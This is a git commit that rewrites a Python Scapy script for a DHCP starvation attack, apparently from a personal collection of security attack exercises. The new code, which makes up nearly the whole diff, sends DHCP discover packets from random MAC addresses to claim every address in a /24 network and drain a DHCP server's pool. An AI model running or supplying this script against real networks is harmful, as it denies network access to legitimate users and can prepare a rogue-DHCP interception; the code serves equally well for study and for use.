4732e65c29902b0ac08dbee996f11ff81f040559
Javier Parada <javierparada73@outlook.com>
2021-11-19 20:00:15 +0100

    fix script

--- security/attacks/dhcp_starvation/main.py
+++ security/attacks/dhcp_starvation/main.py
@@ -1,21 +1,31 @@
-from scapy.all import *
+#!/usr/bin/python3
+
+from scapy.all import RandMAC, Ether, IP, UDP, BOOTP, DHCP, sendp, conf
+from time import sleep
+from ipaddress import IPv4Network
 
 conf.checkIPaddr = False
 
-def build_packet(destiny_mac: str):
-    origin_mac = RandMAC()
-    packet = Ether(src=origin_mac, dst=destiny_mac) \
-            /IP(src='0.0.0.0', dst='255.255.255.255') \
-            /UDO(sport=68, dport=67) \
-            /DHCP(options=[('message-type', 'discover'), ('end')])
+def starve():
+    ips_for_feeding = IPv4Network('192.168.1.0/24')
 
-def starve(destiny_mac: str):
-    packet = build_packet(destiny_mac)
-    sendp(packet, iface='eth0', loop=1)
+    for ip_dir in ips_for_feeding:
+        src_mac = RandMAC()
 
+        ether = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff')
+        ip = IP(src='0.0.0.0', dst='255.255.255.255')
+        udp = UDP(sport=68, dport=67)
+        bootp = BOOTP(op=1, chaddr=src_mac)
+        dhcp = DHCP(options=[
+            ('message-type', 'discover'), 
+            ('requested_addr', str(ip_dir)),
+            ('end')])
+
+        packet = ether / ip / udp / bootp / dhcp
+
+        sendp(packet, iface='eth0', verbose=1)
+
+        # sleep(0.5)
 
 if __name__ == '__main__':
-    print('Starting DHCP starvation attack...')
     starve()
-    print('Attack finished.')
-
